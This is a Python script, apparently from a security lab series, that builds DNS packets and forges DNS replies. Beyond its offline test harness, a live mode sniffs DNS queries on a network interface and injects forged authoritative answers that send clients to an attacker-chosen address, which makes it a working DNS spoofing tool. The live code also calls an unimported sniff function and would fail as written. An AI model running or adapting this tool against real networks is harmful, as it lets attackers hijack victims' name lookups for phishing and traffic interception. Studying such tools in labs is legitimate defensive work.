#!/usr/bin/env python3
"""
N3 - DNS Spoof
Pure-stdlib DNS message construction/parsing, spoof-decider (query-ID match),
and cache-poison logic. All core logic runs unprivileged and deterministically.

Live reply injection on a real interface (raw sockets / root + scapy) is gated
behind --live/--iface. Documentation-only addresses (RFC 5737) are used.
"""
import argparse
import os
import random
import socket
import struct
import sys
import time

try:
    from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sendp  # type: ignore
    _SCAPY = True
except ImportError:
    _SCAPY = False

DNS_PORT = 53
TYPE_A = 1
TYPE_NS = 2
TYPE_CNAME = 5
TYPE_MX = 15
TYPE_AAAA = 28
CLASS_IN = 1


def encode_name(name):
    """Encode a FQDN into DNS wire format labels."""
    if name in ('.', ''):
        return b'\x00'
    out = b''
    for label in name.rstrip('.').split('.'):
        lb = label.encode('ascii')
        out += bytes([len(lb)]) + lb
    return out + b'\x00'


def decode_name(data, offset):
    """Decode a (possibly compressed) DNS name; returns (name, next_offset)."""
    labels = []
    jumped = False
    end = offset
    while True:
        length = data[offset]
        if length == 0:
            if not jumped:
                end = offset + 1
            break
        if length & 0xC0 == 0xC0:
            ptr = ((length & 0x3F) << 8) | data[offset + 1]
            if not jumped:
                end = offset + 2
            jumped = True
            offset = ptr
            continue
        offset += 1
        labels.append(data[offset:offset + length].decode('ascii', 'replace'))
        offset += length
    return '.'.join(labels), end


class DNSMessage:
    """Build a DNS query or spoofed response."""

    @classmethod
    def build_query(cls, fqdn, qid=None, qtype=TYPE_A):
        qid = qid if qid is not None else random.randint(0, 0xFFFF)
        header = struct.pack('!HHHHHH', qid, 0x0100, 1, 0, 0, 0)
        question = encode_name(fqdn) + struct.pack('!HH', qtype, CLASS_IN)
        return header + question

    @classmethod
    def build_spoofed_reply(cls, query_id, fqdn, answer_ip, qtype=TYPE_A,
                            ttl=300, qid=None):
        """Build a spoofed DNS response for a query with the *matching* id."""
        total_qid = qid if qid is not None else query_id
        flags = 0x8180  # response, authoritative, recursion desired+available
        qdcount = 1
        ancount = 1
        header = struct.pack('!HHHHHH', total_qid, flags, qdcount, ancount,
                             0, 0)
        question = encode_name(fqdn) + struct.pack('!HH', qtype, CLASS_IN)
        answer_name = b'\xc0\x0c'  # pointer to name in question
        rdlen = 4 if qtype == TYPE_A else 16 if qtype == TYPE_AAAA else 4
        rdata = socket.inet_aton(answer_ip) if qtype == TYPE_A else \
            socket.inet_pton(socket.AF_INET6, answer_ip) if qtype == TYPE_AAAA \
            else socket.inet_aton(answer_ip)
        answer = answer_name + struct.pack('!HHIH', qtype, CLASS_IN, ttl,
                                           rdlen) + rdata
        return header + question + answer

    @classmethod
    def parse(cls, data):
        """Parse a DNS message -> dict with header + question + answers."""
        if len(data) < 12:
            raise ValueError('truncated DNS header')
        (qid, flags, qdcount, ancount, nscount, arcount) = struct.unpack(
            '!HHHHHH', data[:12])
        offset = 12
        questions = []
        for _ in range(qdcount):
            name, offset = decode_name(data, offset)
            qtype, qclass = struct.unpack('!HH', data[offset:offset + 4])
            offset += 4
            questions.append((name, qtype, qclass))
        answers = []
        for _ in range(ancount):
            name, offset = decode_name(data, offset)
            rtype, rclass, ttl, rdlen = struct.unpack(
                '!HHIH', data[offset:offset + 10])
            offset += 10
            rdata = data[offset:offset + rdlen]
            offset += rdlen
            answers.append((name, rtype, rclass, ttl, rdata))
        return {
            'id': qid, 'qr': (flags >> 15) & 1,
            'qdcount': qdcount, 'ancount': ancount,
            'questions': questions, 'answers': answers,
        }


class DNSSpoofDecider:
    """Decides whether a response is a valid spoof for a given query."""

    def __init__(self, target_domain='example-lab.test', spoof_ip='192.0.2.200'):
        self.target_domain = target_domain
        self.spoof_ip = spoof_ip
        self.pending_queries = {}   # qid -> fqdn
        self.spoofed = 0
        self.caught = 0
        self.log = []
        self.stats = {'queries': 0, 'spoofed': 0, 'mismatch_rejected': 0}

    def note_query(self, query):
        """Register a client's query for later response-matching."""
        p = query if isinstance(query, dict) else DNSMessage.parse(query)
        if not p['questions']:
            return
        fqdn = p['questions'][0][0]
        self.pending_queries[p['id']] = fqdn
        self.stats['queries'] += 1
        self.log.append(('QUERY', p['id'], fqdn))
        return p

    def should_send_spoof(self, query_bytes):
        """Given a fresh client query, build a spoof response for it."""
        p = DNSMessage.parse(query_bytes)
        if not p['questions']:
            return None
        fqdn = p['questions'][0][0]
        self.note_query(query_bytes)
        if self.target_domain in fqdn:
            reply = DNSMessage.build_spoofed_reply(
                p['id'], fqdn, self.spoof_ip)
            self.stats['spoofed'] += 1
            self.spoofed += 1
            self.log.append(('SPOOF_SENT', p['id'], fqdn))
            return reply
        return None

    def verify_response(self, query_bytes, response_bytes):
        """
        Cache-poison/decider logic: a response is accepted only if its query
        ID matches the query we sent. Mismatched IDs are rejected (would-be
        false positives).
        """
        q = DNSMessage.parse(query_bytes)
        r = DNSMessage.parse(response_bytes)
        if r['id'] != q['id']:
            self.stats['mismatch_rejected'] += 1
            self.log.append(('REJECT_MISMATCH', q['id'], r['id']))
            return {'accepted': False, 'reason': 'qid_mismatch',
                    'query_id': q['id'], 'resp_id': r['id']}
        # accepted only if it answers the target domain
        if not r['questions']:
            return {'accepted': False, 'reason': 'no_question'}
        fqdn = r['questions'][0][0]
        if r['answers']:
            self.caught += 1
        return {'accepted': True, 'reason': 'qid_match',
                'fqdn': fqdn,
                'answers': [a for a in r['answers']]}

    def summary(self):
        return dict(self.stats)


def run_harness(domain='example-lab.test', spoof_ip='192.0.2.200'):
    """
    Offline harness: build a real query, spoof a matching-id response, and run
    the decider (matching + cache-poison mismatch rejection).
    """
    decider = DNSSpoofDecider(domain, spoof_ip)
    qid = 0x4242
    query = DNSMessage.build_query(domain, qid=qid)

    print('=== N3 DNS Spoof: offline decider harness ===')
    # 1. valid matching-id spoof
    reply = DNSMessage.build_spoofed_reply(qid, domain, spoof_ip)
    decider.note_query(query)
    v1 = decider.verify_response(query, reply)
    print(f'[matching-id reply] accepted={v1["accepted"]} reason={v1["reason"]}')

    # 2. spoof engine generates a reply for a fresh query
    spoof_reply = decider.should_send_spoof(query)
    print(f'[should_send_spoof] generated={spoof_reply is not None} '
          f'for_domain={domain}')

    # 3. round-trip parse check on generated reply
    p = DNSMessage.parse(spoof_reply) if spoof_reply else None
    if p:
        ans = p['answers'][0] if p['answers'] else None
        if ans:
            print(f'[spoof parse] id={p["id"]} ancount={p["ancount"]} '
                  f'rdata={socket.inet_ntoa(ans[4])}')

    # 4. mismatched-id response is rejected (cache-poison resistance)
    bad_reply = DNSMessage.build_spoofed_reply(qid, domain, spoof_ip,
                                               qid=(qid + 1) & 0xFFFF)
    v2 = decider.verify_response(query, bad_reply)
    print(f'[mismatched-id reply] accepted={v2["accepted"]} '
          f'reason={v2["reason"]}')

    stats = decider.summary()
    print('\n=== Stats ===')
    for k, v in stats.items():
        print(f'  {k}: {v}')

    ok = (v1['accepted'] and spoof_reply is not None
          and not v2['accepted'] and p and p['answers'])
    print('\n[RESULT] ' + ('PASS' if ok else 'FAIL'))
    return 0 if ok else 1


def run_live(interface, domain, spoof_ip, timeout=30):
    """Live sniff-and-spoof on a real interface (root + scapy)."""
    if not _SCAPY:
        print('ERROR: live mode requires scapy. Use --harness.')
        return 1
    if os.geteuid() != 0:
        print('ERROR: live mode requires root (raw sockets).')
        return 1

    decider = DNSSpoofDecider(domain, spoof_ip)
    start = time.time()

    def cb(pkt):
        if pkt.haslayer(UDP) and pkt[UDP].dport == DNS_PORT and \
                pkt.haslayer(DNS) and pkt[DNS].qr == 0:
            reply_bytes = decider.should_send_spoof(bytes(pkt))
            if reply_bytes:
                # build a UDP+dns reply back to the client
                from scapy.all import DNSQR as sQR
                q = DNSMessage.parse(bytes(pkt))
                fqdn = q['questions'][0][0]
                r = DNS(id=q['id'], qr=1, aa=1, qd=sQR(qname=fqdn),
                        an=DNSRR(rrname=fqdn, rdata=spoof_ip))
                sendp(Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
                      IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                      UDP(sport=DNS_PORT, dport=pkt[UDP].sport) / r,
                      iface=interface, verbose=0)
        if timeout and time.time() - start > timeout:
            raise KeyboardInterrupt

    print(f'=== Live DNS spoof on {interface}: {domain} -> {spoof_ip} ===')
    try:
        sniff(iface=interface, filter='udp port 53', prn=cb, store=0)
    except KeyboardInterrupt:
        pass
    return 0


def main(argv=None):
    parser = argparse.ArgumentParser(
        description='N3 - DNS Spoof: DNS engine, spoof decider, cache-poison.') 
    parser.add_argument('--domain', '-d', default='example-lab.test',
                        help='Target domain (lab default)')
    parser.add_argument('--ip', '-p', default='192.0.2.200',
                        help='Redirect IP (TEST-NET default)')
    parser.add_argument('--harness', action='store_true',
                        help='Run offline decider harness')
    parser.add_argument('--live', action='store_true',
                        help='Live sniff-and-spoof (root+scapy)')
    parser.add_argument('--iface', '-i', default='eth0',
                        help='Interface for live mode')
    parser.add_argument('--timeout', type=int, default=30,
                        help='Live mode duration (s)')

    args = parser.parse_args(argv)

    if args.live:
        return run_live(args.iface, args.domain, args.ip, args.timeout)
    return run_harness(args.domain, args.ip)


if __name__ == '__main__':
    sys.exit(main())
